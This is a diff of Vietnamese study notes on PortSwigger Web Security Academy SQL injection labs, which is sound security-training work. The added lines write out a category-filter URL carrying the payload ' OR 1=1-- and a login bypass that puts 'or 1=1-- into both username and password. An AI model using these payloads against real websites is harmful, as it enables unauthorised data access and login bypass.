@@ -27,5 +27,15 @@ Trong trường hợp này, điều kiện '1'='1' luôn đúng, nên điều n�
 
 
 Bài 1 : https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
-    Chắc chắn rồi , nhìn qua chả biết phải bắt đầu từ đâu 
 
+    Thêm +OR+1=1-- vào category 
+    https://0a6b008f044b770281c84dc7007c003f.web-security-academy.net/filter?category=Food+%26+Drink%27+OR+1=1--
+
+    => Lỗi SQL injection ở phần WHERE trong câu truy vấn 
+
+Bài 2 : https://portswigger.net/web-security/sql-injection/lab-login-bypass
+    username: 'or 1=1--
+    password: 'or 1=1--
+
+Bài 3 : https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding
+    Bài này cao hơn chút nhé 
